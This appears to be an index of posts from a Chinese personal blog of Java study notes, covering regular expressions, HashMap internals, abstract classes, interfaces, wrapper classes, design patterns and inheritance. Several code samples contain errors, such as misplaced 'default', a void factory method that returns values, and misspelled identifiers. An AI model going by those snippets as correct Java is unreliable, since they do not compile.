号码：07394790507、(\\\\d&#123;3,4&#125;)?\\\\d&#123;7,8&#125; ； 号码：(0739)-4790507、( \\\\d&#123;3,4&#125;)?|(\\\\(\\\\d&#123;3,4&#125;\\\\)-) )?\\\\d&#123;7,8&#125; ； email 地址格式验证 &#50;&#50;&#x31;&#x35;&#55;&#56;&#50;&#48;&#51;&#49;&#x40;&#x71;&#113;&#46;&#x63;&#x6f;&#109; 用户名：字母数字下划线，不能下划线开头； 域名：字母，数字，下划线 后缀：.cn、.com、.net、.com、.cn 12// &quot;f anging12 @ ishangu . com&quot;String regex = &quot;[a-zA-Z0-9]\\\\W+@\\\\w+\\\\.(cn|com|com.cn|net|gov)&quot; ; java.util.regex 包支持有些情况，需要开发包中的正则处理类。 两个类 Pattern（正则表达式编译类）、Matcher（正则匹配类） Pattern 类 提供正则表达式的编译处理。static compile(regex); ==通过Pattern类静态方法 compile 实例化。== 拆分操作：public String[] split(CharSequence input); 12345String str = &quot;ghrrek3479438343hg3i45894y4gh349&quot; ;String regex = &quot;[^a-zA-Z]+&quot; ;Pattern pat = Pattern.compile(regex) ;String[] result[] = pat.split(str) ;// 输出 result Matcher 类 实例化通过 Pattern 类完成 Matcher matcher(CharSequence input); 获得该类对象后，就可以调用方法。 正则匹配：boolean matches(); 1234567public static void main(String[] args)&#123; String str = &quot;101&quot; ; String regex = &quot;\\\\d+&quot; ; Pattern pat = Pattern.compile(regex) ; Matcher mat = pat.matcher(str) ; System.out.println(mat.matches()) ;&#125; 字符串拆分：replaceAll(String replacement) 获取匹配串 当**==我们需要获取匹配的结果时==**，Java 中并没有提供相关的正则支持方法，所以需要使用原正则工具包中的两个类。 举例：从URLhttps://fangning.xyz/login?username=fangning&amp;password=123456中，获取相关字段的值。 1234567891011121314String URL = &quot;https://fangning.xyz/login?username=fangning&amp;password=123456&quot;;URL = URL.substring(URL.indexOf(&#x27;?&#x27;)+1) ; // username=fangning&amp;password=123456String name = &quot;username&quot; ;String regex = &quot;(^|&amp;)&quot; + username + &quot;=([^&amp;]*)(&amp;|$)&quot;; // 以&amp;或起始符^开始，中间匹配字段名，=号后只要不是 &amp; 的就是值，以&amp;或结束符$结束！Pattern p = Pattern.compile(regex) ;Matcher m = p.matcher(URL) ;while(m.find()) &#123; System.out.println( m.group(0) ); // 整个匹配子串：username=fangning System.out.println( m.group(1) ); // 正则第一个括号匹配结果：null System.out.println( m.group(2) ); // 正则第二个括号匹配结果：fangning System.out.println( m.group(3) ); // 正则第三个括号匹配结果：&amp;&#125; group(2) 及是我们所需要的结果！","link":"","tags":[{"name":"正则表达式","slug":"正则表达式","permalink":"http://www.fangning.xyz.com/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"}]},{"title":"collection和文件接口","date":"2021-11-24T12:02:30.000Z","path":"2021/11/24/2021.11.24 Collection和文件接口/","text":"Collection 接口ListSetMap文件及读写接口FileIO作业 ConcureentHashMap 如何保证线程安全的？ ConcurrentHashMap从JDK1.5开始随java.util.concurrent包一起引入JDK中，在JDK8以前，ConcurrentHashMap都是基于Segment分段锁来实现的，在JDK8以后，就换成synchronized和CAS这套实现机制了。 ConcurrentHashMap保证线程安全主要有三个地方。 一、使用volatile保证当Node中的值变化时对于其他线程是可见的 二、使用table数组的头结点作为synchronized的锁来保证写操作的安全 三、当头结点为null时，使用CAS操作来保证数据能正确的写入。 HashMap中数据实际上存储在哪里？HashMap中哪里使用了数组？使用链表做了什么？Node中存储了什么？为什么要用到红黑树？ HashMap 实际上存储在一个链数组当中，一个Node类型的数组，每个元素可以是一条链表的头结点。 哪里使用了数组：通过哈希值存数据的时候，是根据哈希值获得一个数组的存储下标，然后进行存储。 当数组同一个位置发生哈希冲突的时候，需要在同一个位置插入多个数据，所以使用了链表。 Node中存储了：Key，Value，和下一个Node结点的引用 next 当链表长度过长的时候，为了提高效率，需要将链表转红黑树。 HashMap 是一个数据结构，用来存数据的。 暂且把他看作一个数组。 首先拿到一个数据，我要插入到数组里面去，那么就会有个问题，插入到哪个位置？ HashMap 根据这个数据计算得到的 哈希值 作为数组下标。 比如：我要存一个狗的对象，根据狗的名字，性别，等属性，计算得到哈希值为 4 那么hashMap 就把狗存到数组下标 4 的位置！如上图。大部分情况下，哈希值就可以唯一的表示一个对象数据。 所以数据的哈希值不同，就可以存在数组不同位置，这样就很方便存完所有数据。 HashMap是不能够重复的，你把同一个狗给我，名字啥的都一样，那么哈希值永远是 4， 原来这儿已经有值了，那就不会再存。 但是有特殊情况，就是两个不同的狗，计算得到得到的哈希值是一样的（都是4），这就叫哈希冲突（小概率事件发生）。这种事情发生了，那么我就不对比哈希值了，我直接一个个对比狗的属性（equals方法）。 如果确实不一样，那就得把哈希值相同，但实际上不是同一个的数据，也存起来。存到这个数组 4 位置的后面，用指针链起来。如图，数组4位置，后面链了三个值！（这就是链地址法） 还记得用指针写的链表吗？每个结点就是一个Node，是用来存储数据的，HashMap中就是存&lt; key-value &gt; 键值对。图中整体是个数组，每个数组都是一个Node，Node里面带有一个 next 指针，这玩意可以让他在自己后面再横着链上几个哈希冲突的结点。 还有一个问题，如果数组同一个位置比如 4 ，有很多数据都要放这，后面就链了很长很长，那么就不能用链表存这些哈希值重复的数据，改用红黑树。红黑树是一个自平衡二叉树，查找效率非常高。 Callable 任务 FutureTask1 ——–&gt; Thread1 FutureTask2 ——–&gt; Thread2 FutureTask3 ——–&gt; Thread3 Runnable 任务 Thread1 Thread2 Thread3 Callable任务 ——&gt; FutureTask ——–&gt; Thread1 Thread2 Thread3","link":"","tags":[{"name":"java","slug":"java","permalink":"http://www.fangning.xyz.com/tags/java/"}]},{"title":"抽象封装继承泛型","date":"2021-11-20T03:13:30.000Z","path":"2021/11/20/2021.11.20 封装抽象接口泛型/","text":"抽象类​ 类继承主要作用是扩充已有类的功能，==对子类无法做出强制性约束（必须让你覆写某方法）==。 ​ 实际开发过程中，==经验：很少需要去继承一个完善的类。而是要继承抽象类。== ​ 以后进行父类的设计，优先考虑抽象类。也就是**==只有写抽象类的时候，才用得到继承==**。 定义 特点 本身由 abstract 定义，且含 abstract 修饰的抽象方法； 抽象类“不是完整的”； 抽象方法必须让其子类完成。 经验 抽象类无法直接实例化； 但是可以==通过其子类对象，向上转型==得到==抽象类的实例对象==。 抽象类，用来进行过度操作。解决类继承过程中的代码重复操作。 1234567891011121314151617181920212223abstract class Message &#123; // 抽象类 private String message ; public abstract void printMsg() ; // 抽象方法 public void setMessage(String msg) &#123; this.message = msg ; &#125; public String getMessage() &#123; return this.message ; &#125;&#125;class DateBaseMessage extends Message &#123; // 继承 public void printMsg() &#123; System.out.println(this.getMessage()) ; &#125;&#125;public class Hello &#123; public static void main(String[] args) &#123; Message msg = new DateBaseMessage() ; // 上转对象多态 msg.setMessage(&quot;信息&quot;) ; ((DateBaseMessage)msg).printMsg() ; &#125;&#125; 相关说明 ==不能使用 final== 关键字定义抽象类； 抽象类==是加强版的普通类==； 可以==有构造方法==，普通方法，普通属性。 抽象类没有无参，子类需要显示调用父类的有参。 抽象类==可以无抽象方法==。 但仍不可以直接实例化对象。 抽象类可以==有static方法==。 static 修饰的属性、方法，永远不受类的结构限制，可直接调用！ 一般用来返回一个==向上转型后的抽象类的子类实例化对象== ==重点==：我们使用 API 中一些抽象类的时候，就很多时候，需要调用它们的静态方法**==getInstance()==**来实例化对象。 好处：不需要记住子类名称，就可以直接得到其对象。 DateFormat datFormat = DateFormat.getDateInstance() DateFormat timeFormat = DateFormat.getTimeInstance() Calendar calen = Calendar.getInstance() 模版设计模式(抽象类应用)​ 任务要求： ​ 通过命令控制机器人、人、猪做三件事情，分别是睡觉、吃饭、工作；其中猪不能工作，机器人不需要吃饭； 抽象类，是==比类更加高一层的定义，是对抽象的抽象==。 将显示事物机器人、人、猪分别抽象成机器人类、人类、猪类； 将每一类角色的行为，抽象成抽象的行为类； 上层抽象类==提供对事物行为进行抽象的方法，和具体控制方法；抽象方法可以在抽象类的具体方法中调用==。 抽象行为类中，提供睡、吃、工作三个抽象方法； 并且定义的常量指令，控制相应行为。1 表示睡，2 表示吃，4 表示工作； 在控制方法中调用 eat、sleep、work 指令的设计技巧 定义整型常量，表示一个行为指令。==每个指令的值都是2的次方，指令相加表示复合行为==； 1表示eat、2表示sleep、4表示work，则 1+2 表示 eat&amp;sleep，1+2+3 表示 eat&amp;sleep&amp;work ==通过静态方法间接实例化抽象类对象==。 编写子类继承抽象类 普通类对现实进行抽象，关注显示事物属性； 抽象类对普通类抽象，关注一系列普通类的共同特点（例如，行为）。 编写三个普通类，继承抽象行为类，实现所有抽象类； 如果==普通类不需要某抽象方法，写成空即可。== 实现代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899abstract class Action &#123; public static final int EAT = 1 ; public static final int SLEEP = 2 ; public static final int WORK = 4 ; public static Person getPersonInstance() &#123; return new Person() ; &#125; public static Robot getRobotInstance() &#123; return new Robot() ; &#125; public static Pig getPigInstance() &#123; return new Pig() ; &#125; public void command(int op) &#123; switch(op) &#123; case EAT : this.eat() ; break ; case SLEEP : this.sleep() ; break ; case WORK : this.work() ; break ; case EAT + SLEEP + WORK : this.sleep() ; this.eat() ; this.work() ; break ; default : System.out.println(&quot;命令错误！&quot;) ; break ; &#125; &#125; public abstract void eat() ; public abstract void sleep() ; public abstract void work() ;&#125;class Person extends Action &#123; public void eat() &#123; System.out.println(&quot;人很平静的在餐座上吃饭...&quot;) ; &#125; public void sleep() &#123; System.out.println(&quot;人在床上平躺睡觉...&quot;) ; &#125; public void work() &#123; System.out.println(&quot;人每天很努力地工作...&quot;) ; &#125;&#125;class Robot extends Action &#123; public void eat() &#123; System.out.println(&quot;机器人充电补充能量...&quot;) ; &#125; public void sleep() &#123; &#125; public void work() &#123; System.out.println(&quot;机器人正在高效工作...&quot;) ; &#125;&#125;class Pig extends Action &#123; public void eat() &#123; System.out.println(&quot;猪扑哧扑哧地在食槽中进食...&quot;) ; &#125; public void sleep() &#123; System.out.println(&quot;猪在草堆中睡觉...&quot;) ; &#125; public void work() &#123;&#125;&#125;public class Hello &#123; public static void main(String[] args) &#123; Action personAction = Action.getPersonInstance() ; Action robotAction = Action.getRobotInstance() ; Action pigAction = Action.getPigInstance() ; System.out.println(&quot;\\n-----通过指令控制人行为------&quot;) ; personAction.command(Action.SLEEP + Action.EAT + Action.WORK) ; System.out.println(&quot;\\n-----通过指令控制机器人行为------&quot;) ; robotAction.command(Action.SLEEP + Action.EAT + Action.WORK) ; System.out.println(&quot;\\n-----通过指令控制猪行为------&quot;) ; pigAction.command(Action.SLEEP) ; pigAction.command(Action.EAT) ; &#125;&#125;/*-----通过指令控制人行为------人很平静的在餐座上吃饭...人在床上平躺睡觉...人每天很努力地工作...-----通过指令控制机器人行为------机器人充电补充能量...机器人正在高效工作...-----通过指令控制猪行为------猪在草堆中睡觉...猪扑哧扑哧地在食槽中进食...*/ 心得总结 技巧： 普通类是对现实事物的抽象；抽象类是对普通类的抽象。 编写抽象类的时候，可以把类看作现实事物，把抽象类看做类。类比，类的编写方式，去编写抽象类。发现类中的一些属性，共同的行为抽象成抽象类中的方法。 abstract父类 主要目的 提供子类的实例化对象； 对所有子类共同行为的抽象； 另外一个，是对所有行为个规范，==通过父类的普通方法调用抽象方法完成。== 只在父类中，调用和使用所有子类的抽象方法。 父类不承认的子类特殊方法，父类不能调用，也就没用。 ==父类要要包含所有子类所必须的方法。== 比如 Number 抽象类，提供了 byteValue(),shortValue(),intValue(),longValue()，虽然一个子类Byte,Short,Integer只真正覆写其中一个方法，但是仍然需要全部写到父类中。 类似于填表格，姓名栏、生日栏必须填相应的信息，==抽象父类就是一个模板！== 抽象类的使用是一个技术活，如果要把抽象类用到极致，还有很长的路要走！！！ 包装类​ 主要针对于基本数据类型的对象转换而实现的。如果要将基本数据类型，作为类类型进行处理，需要对其进行包装。​ 例如：Object 如果要接受基本数据类型，就需要进行包装。 本质上就是普通类中添加基本数据类型的属性字段。 123456789public class Int &#123; private int data; public Int(int data)&#123; this.data = data ; &#125; public int intValue() &#123; return this.data ; &#125;&#125; ==基本数据类型一共有8类==，所以包装类一共有 8 类。（char、boolean） 包装类： 对象型包装类（Object 直接子类）：Boolean、Character。 数值型包装类（Number 直接子类）：Byte、Short、Integer、Long、Float、Double。 ==抽象 Number 中的方法：== 方法名 作用 public byte byteValue() 从包装类中获取 byte public short shortValue() 从包装类中获取 short public abstract int intValue() 从包装类中获取 int public abstract long longValue() 从包装类中获取 long public abstract float floatValue() 从包装类中获取 float public abstract double doubleValue() 从包装类中获取 double 装、拆箱 装箱方法 构造方法：Integer integer = new Integer(int i) 包装类的静态方法==xxx.valueOf()==：Integer integer = Integer.valueOf(int i) 拆箱方法 包装类中普通方法==xxx.xxxValue()==：int i = integer.intValue() ==JDK 1.9 以后，所有的包装类构造方法变成了过期处理==，因为有自动进行装箱处理，不需要手动进行装箱。 ==Object 可以直接接受基本数据类型。== 12345678910111213141516public class Hello &#123; public static void main(String[] args) &#123; Double d = new Double(1.1) ; System.out.println(d*1.5) ; // 包装类可以直接数学运算 Object obj = 19 ; System.out.println( (Integer)obj ) ; // Object 可以直接接收基本数据类型 &#125;&#125;/*Hello.java:3: 警告: [removal] Double 中的 Double(double) 已过时, 且标记为待删除 Double d = new Double(1.1) ; ^1 个警告*/ 包装类==判断 自动装拆箱 一个字节以内的包装类，可以直接用 == 判断，值相等则结果为 true 。 一个字节之后，就只能使用 equals 方法进行判断值相等。 内部使用了常量池，进行了共享空间，节约内存的优化。 构造实例化 则和 String 一样，属于堆区不同地址，无法用 == 判断。 所以，这也是一个将包装类构造作为过期操作的原因。 ==统一使用 .equals 做包装类的比较==。 接口​ 当能够灵活使用抽象类和接口进行设计，那么表示基本上理解了面向对象的概念。需要大量程序代码累计。 基本定义 抽象类与普通类相比优势：可实现对子类覆写方法的控制。 抽象类里面可能有普通方法，==普通方法会涉及到一些安全和隐私操作问题==，如果实际开发过程中。 ==如果要对外部隐藏操作过程的细节，需要通过接口来进行描述。== 普通方法让抽象类方便集中控制，但是也造成了操作过程不安全； 因此需要一个纯粹的抽象类 —— 接口，进行进一步封装。 接口特点 使用Interface关键字定义； 成员和方法，默认且只能使用public修饰符； 只含有静态变量、常量； 无构造方法；一般只能有抽象方法，JDK1.8以后可以有default修饰的普通方法、 static 修饰的静态方法； 无法直接实例化，**子类可以多实现implements。** 使用 命名：==为与类名进行区分，使用大写&#39;I&#39;作为首字母开头==。 实现：需要被子类实现（implements），一个子类可实现多个 Interface 接口。 实现类：如果不是抽象类，一定要==重写所有接口抽象方法==（同抽象父类）。 接口对象：可以利用==子类对象的向上转型间接得到接口对象==（同抽象父类）。 ==使用接口目的：为了实现多继承（一个类实现多个接口）。== 123interface IMessage&#123; &#125; 问题： MessageImpl类对象，可以任意转换为——父类、父接口类型。 接口绝对无法继承类，==Object不是接口的父类==。 ==Object 可以接收所有数据类型==（基本数据类型、类对象、接口对象、数组）。 Imessage msg = new MessageImpl(); Object obj = msg; 接口和父类，没有任何关系；但是，通过子类，可以将两者连接起来。 转型过程，只关注 new 的子类，不看引用名称的类型，只看对象类型。 ==接口描述的是一个公共的定义标准，所以，所有抽象方法访问权限都是public的==。可以省略属性和方法的访问修饰符。 123456public static final String INFO = &quot;www.ishangu.com&quot; ;public static String getInfo() ;// 等价于String INFO = &quot;www.ishangu.com&quot; ;String getInfo() ; 开发经验 实际开发过程中，接口可以由抽象类来实现； 一个抽象类可以实现多个接口； 一个==普通类==只能够继承一个抽象类，并可以实现多个父接口（**==必须先继承，后实行==**）。 实际开发过程中，接口的使用形式 进行标准设置； 表示一种操作能力； 暴露远程方法视图，这个一般都在 RPC 分布式开发中使用。 接口定义加强接口不当设计​ 接口都是由全局常量和抽象方法组成，如果==接口设计不当==，就有可能造成一些问题。比如，当一个接口有很多实现的时候，如果重新给==接口追加方法==，就需要在所有的实现类中覆写所追加的方法。 ​ 接口设计最初，如何人都不能保证，接口设计毫无差错。所以，在这样的情况下，==往往不会直接让子类实现接口，而是中间最追加一个过渡的抽象类。== ​ 让中间的过度抽象类，来实现新追加的方法，这样所有的子类就都间接继承拥有了该方法。 JDK 1.8后​ jdk1.8后，为解决设计缺陷，允许接口中定义普通方法（default方法和static方法）。 ​ 接口中的普通方法必须追加 default 的声明，但是需要提醒的是，==该操作属于挽救功能==，不应该是设计的首选。 12345678910111213141516171819202122232425262728293031323334353637interface IMessage &#123; String message() ; // 普通方法 ———— 方法是一个公共方法，都具备。 public boolean default connect() &#123; System.out.println(&quot;建立消息发送通道成功！&quot;); return true; &#125; // 静态方法 public static IMessage getInstance() &#123; return new MessageImpl() ; &#125;&#125;class MessageImpl implements IMessage &#123; public String message() &#123; if(this.connect()) return &quot;www.ishangu.com&quot; ; else return &quot;no message&quot; ; &#125;&#125;public class Test &#123; public static void main(String[] args) &#123; IMessage msg = new MessageImpl() ; if(msg.connect()) &#123; System.out.println(msg.message()); &#125; IMessage msg = IMessage.getInstance() ; if(msg.connect()) &#123; System.out.println(msg.message()); &#125; &#125;&#125; 注意​ 虽然接口中可以用普通方法和静态方法，功能可以取代抽象方法；==但是，开发过程中，能不使用就不适用==，这些措施只是补救措施。 ==接口定义标准==​ 对于借口而言，开发之中最为==重要的应用就是进行标准的制定==，实际上日生活中也经常听见：USB 接口、PCI 接口、鼠标接口等等，这些实际上就是属于标准的应用。 ​ 比如，电脑上可以插入各种 USB 设备，电脑认的是 USB 标准，而不关心这个标准的具体实现类。 ​ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849interface IUSB &#123; puiblic boolean check() ; public void work() ;&#125;// 使用了 USB 标准的产品，电脑class Computer &#123; // 应用方，只认接口，并且按照接口标准调用。 // 并不管，接口的实现类是谁。 public void plugin(IUSB usb) &#123; if(usb.check()) &#123; usb.work(); &#125; else &#123; System.out.println(&quot;USB 设备错误！&quot;); &#125; &#125;&#125;// 应用了 USB 接口标准的设备class Keyboard implements IUSB &#123; public boolean check() &#123; return true ; &#125; public void work() &#123; System.out.println(&quot;键盘正常工作！&quot;); &#125;&#125;class Print implements IUSB &#123; public boolean check() &#123; return false ; &#125; public void work() &#123; System.out.println(&quot;打印机正常工作&quot;); &#125;&#125;public class Test &#123; public static void main(String[] args) &#123; Computer computer = new Computer() ; Keyboard keyboard = new Keyboard() ; computer.plugin(keyboard); Print print = new Print() ; computer.plugin(print); &#125;&#125; 注意​ 实际开发过程中，==两个不同类型，使用接口标准进行联系起来==。人，和各类食物，需要制定可食用健康标准，以此达到人吃食物的联系。 ​ 实际使用过程中，使用方只需要明确知道提供有哪些标准，并且调用标准方法。而，不需要管，实现标准的类是谁。 工厂设计模式==设计模式==​ 对于接口而言，必须有子类，并且子类可以通过对象的向上转型，来进行实例化。但是在对象实例化过程之中，也可能存在有设计问题。 ​ 设计，是一种相对而言比较虚幻的东西，但是毕竟有很多成功的设计摆在面前，我们该吸收这种设计的思想，并且了解为什么会有这种设计的产生。 使用 new 关键字实例化123456789101112131415interface IFood &#123; void eat() ;&#125;class Bread implements IFood&#123; public void eat() &#123; System.out.pritln(&quot;吃面包。&quot;); &#125;&#125;public class Test() &#123; public static void main(String[] args) &#123; IFood bread = new Bread() ; bread.eat() ; &#125;&#125; 该程序中，将 main 方法作为客户端。客户端需要明确知道具体的哪一个子类，所需要的食物是什么类型，才能完成吃的动作。因为，==采用了 new 关键字，所以必须知道类型new Bread()==。 客户端只关注东西，不关注东西从哪儿来，什么类型！如果，==现在增加一类事物，客户端的代码需要改动。== 耦合问题​ 代码中的问题，就是耦合问题。造成耦合的元凶就是 —— ==“new 关键字”==。 ​ 一个类，完成一组功能时，需要借助另外一个类，如果依赖类进行修改或扩充，就需要同时修改依赖于它的类，这就是耦合。耦合，会提高代码维护和扩展难度。 ​ ==良好的设计，应该避免耦合==。 工厂设计模式​ 客户端只需要关注接口标准，以及工厂即可；而，所有产品类需要遵守接口标准，并且由工厂类来关注，生成所有的接口实现类。 123456789101112131415161718192021222324252627282930313233interface IFood &#123; void eat() ;&#125;class Factory &#123; public static void getInstance(String foodName) &#123; if(&quot;Bread&quot;.equals(foodName)) return new Bread(); else if(&quot;Milk&quot;.equals(foodName)) return new Milk(); else return null ; &#125;&#125;class Bread implements IFood&#123; public void eat() &#123; System.out.pritln(&quot;吃面包。&quot;); &#125;&#125;class Mile implements IFood &#123; public void eat() &#123; System.out.println(&quot;喝牛奶。&quot;); &#125;&#125;public class Test() &#123; public static void main(String[] args) &#123; IFood food = Factory.getInstance(args[0]) ; food.ead() ; &#125;&#125; 代理设计模式（Proxy）代理设计模式，是可以帮助用户将所有的开发注意力只集中在和核心功能上。 肚子饿，思考如何吃到东西； 上课，主要是学习，而不需要管老师如何备课； ==有另外一方，提供除核心功能以外的所有服务。== 123456789101112131415161718192021222324252627282930313233343536373839404142interface IEat &#123; void get() ;&#125;class EatReal implements IEat &#123; public void get() &#123; System.out.println(&quot;【真实主题】得到一份事物，而后品尝！&quot;); &#125;&#125;// 代理类也是接口的一个实现类class EatProxy implements IEat &#123; // 代理类中，一定有一个服务对象。 private IEat eat ; public EatProxy(IEat eat) &#123; this.eat = eat ; &#125; // 服务的接口方法，实际上调用了被服务的对象的接口方法。 public void get() &#123; // 但是，在调用过程中，添加了其他属于代理类的一些服务方法。 this.prepare() ; this.eat.get() ; this.clear() ; &#125; public void prepare() &#123; System.out.println(&quot;【代理主题】1、精心购买食材。&quot;); System.out.println(&quot;【代理主题】2、制作美食！&quot;); &#125; public void clear() &#123; System.out.println(&quot;【代理主题】3、清理餐具。&quot;); &#125;&#125;public class Test &#123; public static void main(String[] args) &#123; IEat myEat = new EatProxy(new EatReal()) ; // 这里最好采用工厂设计模式 myEat.get() ; &#125;&#125; 特点 ==一个接口提供有两个子类，其中一个子类是真实业务操作类；另外一个子类是代理业务操作类。== 将真实业务外层包裹一层代理业务操作类，设计时只需要将核心业务放到真实业务类中完成，非核心的放到外层代理中完成。 抽象类与接口区别​ 实际开发过程中，抽象类和接口的定义形式非常类似。特别是从 JDK 1.8 开始，接口也可以定义 default 和 static 方法，但是这两者依旧有着明显的定义区别。 NO 区别 抽象类 接口 1 定义关键字 abstarct class 抽象类名 interface 接口名称 2 组成 构造、普通方法、静态方法、全局常量、普通成员 抽象方法，全局常量，JDK1.8后（普通方法，静态方法） 3 权限 可以使用各种权限定义 只能使用 public 4 子类使用 子类通过 extends 单继承 子类通过 inplements 多实现接口 5 两者关系 抽象类可以实现若干个接口 接口不允许继承任何类 6 使用 1、抽象类或接口必须定义子类；2、子类必须全部实现父类的所有抽象方法；3、无法直接实例化，只能通过子类的向上转型获得实例。 同抽象类。 注意 当我们接口和抽象类都可以使用的情况下，优先使用接口，因为接口可以多实现。 以后设计过程中，==类的设计是最终的设计，而接口和抽象类的设计才是最初的设计==。 并且，抽象类的设计现阶段运用不上，可以直接设计接口，然后用类实现。 抽象类与接口案例​ 抽象类和接口是 Java 里面最为核心的概念，也是设计模式的综合体现，包括在日后的学习过程中也会接触到许多系统提供的抽象类和接口。 案例一考虑一个绘图的标准，并且根据不同的图形来进行绘制； 设计： 各种图形，需要满足图形标准； 指定工厂，来生产各种图形； 客户端只需要根据从工厂得到图形，并且根据标准提供的接口，进行图形绘制得到文件。 1234567891011121314151617interface IGraphical &#123; public void paint() ;&#125;class Point &#123; private double x ; private double y ; public Point(double x, double y) &#123; this.x = x ; this.y = y ; &#125; // getter&#125;class Trigangle implements IGrahical &#123; private Point[] a ; // 第一条边的坐标，起点，终点 private Point[] b ; private Point[] c ;&#125;","link":"","tags":[{"name":"java","slug":"java","permalink":"http://www.fangning.xyz.com/tags/java/"}]},{"title":"继承重写多态","date":"2021-11-15T12:23:30.000Z","path":"2021/11/15/2021.11.15 继承重写多态/","text":"继承引入编写 Person 类的时候，需要有姓名、年龄属性，同时编写 setter，getter方法； 但是，在编写 Student 类的时候，仍然需要重复编写以上两个属性和方法，同时学生还有特殊的属性和方法需要==扩充==，比如 school 属性。 此时如果还进行分别定义简单 java 类，就显得代码重复。 ==本质：== 对已有的父类的属性和方法进行扩充 ； 实现 使用 ==extends关键字== class subClass extends supClass&#123;&#125; 子类不定义任何东西，可直接使用父类方法。 123456789101112131415161718192021222324252627282930class Person &#123; private String name ; private int age ; public void setName(String name) &#123; this.name = name; &#125; public void setAge(int age) &#123; this.age = age ; &#125; public String getName() &#123; return this.name ; &#125; public int getAge() &#123; return this.age ; &#125; public String getInfo() &#123; return String.format(&quot;姓名：%s; 年龄：%d&quot;, this.name, this.age) ; &#125;&#125;class Student extends Person &#123; &#125;public class JavaDemo &#123; public static void main(String[] args) &#123; Student stu = new Student() ; stu.setName(&quot;林强&quot;) ; stu.setAge(18); System.out.println(stu.getInfo()) ; &#125;&#125; 内存分析 子类扩充完其他属性之后： 123456789101112class Student extends Person &#123; private String school ; public void setSchool(String school) &#123; this.school = school ; &#125; public String getSchool() &#123; return this.school ; &#125; public String getInfo() &#123; return String.format(&quot;姓名：%s; 年龄：%d; 学校：%s&quot;, this.getName(), this.getAge(), this.school) ; &#125;&#125; 子类的属性实例化在子类的堆区、父类的属性在父类的堆区、==实例化子类对象时，实际上实例化了两个对象，另一个是父类对象。== 子类实例化定义 ==super==关键字 功能类似this 功能一：表示父类，==在子类中调用父类的属性，或方法需要用到 super==。 功能二：表示==调用父类的构造方法==。放置在子类构造方法的==首行==。 原则是，只要是用到了，从父类所继承的东西，都使用 super 关键字进行调用。 默认子类的构造方法首行包含一个 super()，调用父类的无参构造； 如果父类没有==无参构造，则必须进行修改，用 super([参数]) 调用父类有参构造。== 这就是为什么简单 java 类需要保留无参构造的原因，可以省略对子类构造方法首行 super() 方法的修改。 123456789101112public Person &#123; public Person(String name) &#123; System.out.println(&quot;定义了一个父类对象&quot;) ; &#125;&#125;public Student extends Person &#123; public Student() &#123; super(&quot;名字&quot;) ; System.out.println(&quot;定义了一个子类对象&quot;) ; &#125;&#125;// new Student() 同时实例化了两个对象！ 继承的限制 Java 中==不允许多重继承==，只允许多层继承 也就是可以有子类，子类再继承给子类； 但是一个类，只能继承一个父类。 注意：有些语言是支持多重继承的。 错误 正确 class A {} class B{} class C extends A, B{} class A{} classB extends A {} C extends B {} 注意：即使是多层继承，也==不允许出现太多层的情况。== private 属性的继承 ==子类继承了父类所有东西==。 公开属性隐式继承，私有属性隐式继承。 隐式继承的属性，只能进行间接访问，通过 setter ，getter 方法。 覆写子类需要在保留父类原有功能的基础上，更新原有的一些功能；保留方法名，但是重写方法实体。我要保留你的操作，但是==要根据阶段不同，重新定义一些内容。== 覆写（重写）发生在子父类之间，重载发生在同一个类内部的同名方法。 区别 Overloading Overrite 中文 重载 重写 概念 方法名称相同，参数类型及个数不同 方法名称相同，参数类型和个数相同 权限 无限制 重写方法不能比原方法更加严格 ==方法的覆写== 方法名称相同，参数类型和个数完全和父类一致，就是==声明和父类方法一毛一样。== 1234567891011class Channel &#123; public void connect() &#123; System.out.println(&quot;【Channel】父类进行资源连接&quot;) ; &#125;&#125;class DatebaseConnect extends Channel&#123; public void connect() &#123; super.connect() ; // 保留父类方法同时，增加新的方法体。 System.out.println(&quot;【DatebaseConnect】子类进行数据库连接&quot;) ; &#125;&#125; ==实现了对父类方法的优化。== 子类有该方法，先调用优化后的方法，如果没有再调用父类方法。 ==限制：== 覆写的方法，不能有比父类更加严格的==访问控制权限== public &gt; protected &gt; default &gt; private 在以后开发过程中，==95%的方法都是 public== 。 父类中private修饰的方法 ，不能够被继 承，所以如果子类对该方法覆写，其实是进行重写定义。 123456789101112131415161718public SupClass &#123; private void printMsg() &#123; System.out.println(&quot;父类&quot;) ; &#125; public void fun() &#123; this.printMsg() ; &#125;&#125;public SubClass extends SupClass &#123; public void printMsg() &#123; System.out.println(&quot;子类&quot;) ; &#125;&#125;&#123; SubClass sub = new SubClass() ; sub.fun(); // 打印输出：&quot;父类&quot;&#125;// 若主类中 printMsg 不是 private 则结构为 &quot;子类&quot; ==属性覆盖== 子类中定义和父类一样的属性，那么调用将直接使用子类新定义的属性。 如果父类中同名属性权限为 private， 则，并没有被覆盖。 12345678910111213141516171819class SupClass &#123; public String strA = &quot;123&quot; ; private String strB = &quot;456&quot; ; public void fun() &#123; System.out.println(this.strA) ; // 从子类中找 strA 321 System.out.println(this.strB) ; // ##还是父类的 strB## &#125;&#125;class subClass &#123; public String strA = &quot;321&quot; ; public String strB = &quot;654&quot; ; public String getStrA() &#123; return this.strA; return super.strA; // 从父类中直接找，得到 123 &#125; public String getStrB() &#123; return this.strB; &#125;&#125; ==this 与 super区别== this：==表示先从本类进行查找，如果没有找到，再从父类进行查找==。super：==直接从父类开始查找。== this和super都可以进行==构造方法的调用==，this() 调用的是本类的构造，super() 调用的是父类的构造。只能在构造方法的首行调用。 this 可以表示==当前对象==。 final关键字​ final：描述的是终接器的概念，java中使用 final 关键字可以实现==不能够被继承的类、不能够被覆写的方法、常量==。 final class：如果你想定义一个不被继承的类。 final 方法：应用层开发可能用得比较少，但是如果是底层开发，需要接触到许多不能够被覆写的方法。 final 常量：用一个变量来表示一个不可修改的状态，比如开关的开、关； 常量往往是公共的，public static final 来进行定义。 每个字母==大写==表示。 12public static final int ON = 1 ;public static final int OFF = 0 ; 继承案例分析学生类建立一个人类，和学生类，功能： Person 中包含 4 个私有型数据成员 name, addr, sex, age, 分别为字符串，字符串，字符，整型。一个4参，一个2参，一个无参方法，一个输出属性信息。 Student 类继承Person类，增加 math, englishi 存放成绩，一个6参，2参，无参构造方法和重写输出方法用于显示6种属性。 正常来讲，进行程序开发的时候，不需要考虑子类的问题。 管理人员与职员定义员工类，具有姓名、年龄、性别属性，并具有构造方法和显示数据方法。 